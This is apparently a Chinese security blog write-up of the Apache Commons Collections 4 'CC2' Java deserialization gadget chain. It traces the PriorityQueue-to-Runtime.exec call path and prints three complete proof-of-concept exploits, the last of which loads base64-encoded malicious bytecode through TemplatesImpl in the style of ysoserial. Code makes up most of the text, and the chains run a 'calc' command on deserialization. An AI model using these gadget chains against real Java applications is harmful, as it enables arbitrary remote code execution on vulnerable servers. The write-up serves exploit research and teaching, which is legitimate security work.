### 调用链

```
ObjectInputStream.readObject()
            PriorityQueue.readObject()
                ...
                    TransformingComparator.compare()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()
```

### 初始poc

```java
package org.example;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;


import java.io.*;
import java.util.Comparator;
import java.util.PriorityQueue;
public class CC2 {

    public static void main(String args[]) throws IOException, ClassNotFoundException {
        String cmd = "calc";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };
        ChainedTransformer Truetransformer = new ChainedTransformer(transformers);
        Comparator comparator = new TransformingComparator(Truetransformer);
        PriorityQueue priorityQueue = new PriorityQueue(1,comparator);
        priorityQueue.add(2);
        priorityQueue.add(3);

    }

}

```

先解释一下这个poc，会弹两次计算器，在序列化之前触发

TransformingComparator#compare调用了transform,我们的目标是触发这里

```java
    public int compare(I obj1, I obj2) {
        O value1 = this.transformer.transform(obj1);
        O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
```

找一个调用了compare方法的类，倒推回去PriorityQueue这个类

readObject()中调用了heapify(),来看下

```java
    private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
```

heapify -> siftDown()

```java
    private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    }
```

siftDown -> siftDownUsingComparator()

```java
    private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
```

可以看到调用的compare()，很清晰

+ 为什么这里没有进行序列化也触发了，并且触发两次计算器

  把断点下载exec看一下调用

  ![image-20240510144954151](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240510144954151.png)

  add其实调用了offer(),offer调用了siftUp导致提前进判断

  ```java
      private void siftUp(int k, E x) {
          if (comparator != null)
              siftUpUsingComparator(k, x);
          else
              siftUpComparable(k, x);
      }
  ```

  并且我们这里comparator为true,进第一个判断，直接调用compare()

  ![image-20240510145137600](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240510145137600.png)

  调用了两次transform()

+ 为什么要add()添加队列元素

  因为PriorityQueue类其实就是一个排列方法，最后完成一个最大或者最小堆，就像我们之前分析siftDown()方法一样。为了调用这个方法，会要求队列中至少有三个成员

后续我们只需要改掉提前触发的问题即可

### 改进POC

之前有调过CC6，不难想到先传一个fakechain,再通过反射的方式给他修改回来

```java
package org.example;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;


import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2 {

    public static void main(String args[]) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        String cmd = "calc";
        Transformer[] faketransform = new Transformer[]{
                new ConstantTransformer("fake")
        };
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };
        ChainedTransformer faketransformer = new ChainedTransformer(faketransform);
        ChainedTransformer truetransformer = new ChainedTransformer(transformers);
        Comparator comparator = new TransformingComparator(faketransformer);
        Comparator truecomparastor = new TransformingComparator(truetransformer);
        PriorityQueue priorityQueue = new PriorityQueue(1,comparator);
        priorityQueue.add(2);
        priorityQueue.add(3);

        Field transform = PriorityQueue.class.getDeclaredField("comparator");
        transform.setAccessible(true);
        transform.set(priorityQueue,truecomparastor);


        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(priorityQueue);
        out.flush();
        out.close();
        byte[] bytes = baos.toByteArray();
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream in = new ObjectInputStream(bais);
        in.readObject();
    }

}

```

写的比较丑陋，其实可以用别的构造方法简化，我这里就不做了

### javassist库

Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。
能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。
Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。

这个库我们主要用到两个方法

ClassPool

ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。

CtClass

CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取。

我们可以构建一个新类，获取其字节码

```java
import javassist.*;

public class javassit_test {

    public static void createPerson() throws Exception{
        //实例化一个ClassPool容器
        ClassPool pool = ClassPool.getDefault();
        //新建一个CtClass，类名为Cat
        CtClass cc = pool.makeClass("Cat");
        //设置一个要执行的命令
        String cmd = "System.out.println(\"javassit_test succes!\");";
        //制作一个空的类初始化，并在前面插入要执行的命令语句
        cc.makeClassInitializer().insertBefore(cmd);
        //重新设置一下类名
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        //将生成的类文件保存下来
        cc.writeFile();
        //加载该类
        Class c = cc.toClass();
        //创建对象
        c.newInstance();
    }

    public static void main(String[] args) {
        try {
            createPerson();
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

[示例代码](https://xz.aliyun.com/t/12544?time__1311=mqmhD50KBKYIoxBqDTjgDcmKD8DuBQh1YD&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-12)

### POC2

ysoserial是通过执行TemplatesImpl.newTransformer方法来加载字节码

![image-20240514221448248](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240514221448248.png)

控制this.transformer为InvokerTransformer,InvokerTransformer设置为newTransformer方法，obj1控制为TemplatesImpl，这样就能执行TemplatesImpl.newTransformer方法

在之前我们已经分析过obj1来自于x,是通过siftDown传入

![image-20240514222402937](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240514222402937.png)

siftDown的x由queue[i]决定,最后的调用

![image-20240514224614683](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240514224614683.png)

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;


import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2_y{

    public static void main(String args[]) throws Exception {

        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKgoABgAdCgAeAB8IACAKAB4AIQcAIgcAIwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAXTG9yZy9leGFtcGxlL2NsYXNzY29kZTsBAApFeGNlcHRpb25zBwAkAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADmNsYXNzY29kZS5qYXZhDAAHAAgHACUMACYAJwEABGNhbGMMACgAKQEAFW9yZy9leGFtcGxlL2NsYXNzY29kZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAsABAAMAA0ADQALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAQAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABAACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgABABAAFgABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAEwALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABcAGAACAAAAAQAZABoAAwABABsAAAACABw=");
        TemplatesImpl impl = new TemplatesImpl();
        setFieldValue(impl, "_name", "uu2fu3o");
        setFieldValue(impl, "_bytecodes", new byte[][]{code});
        setFieldValue(impl, "_class", null);
        setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        Comparator comparator = new TransformingComparator(invokerTransformer);
        PriorityQueue queue = new PriorityQueue(1,comparator);
        queue.add(2);
        queue.add(3);

        //反射修改方法为newTransformer
        setFieldValue(invokerTransformer, "iMethodName", "newTransformer");
        //反射传入对象
        Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = impl;
        queueArray[1] = 1;


        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(queue);
        out.flush();
        out.close();
        byte[] bytes = baos.toByteArray();
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream in = new ObjectInputStream(bais);
        in.readObject();
    }

    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }
}

```

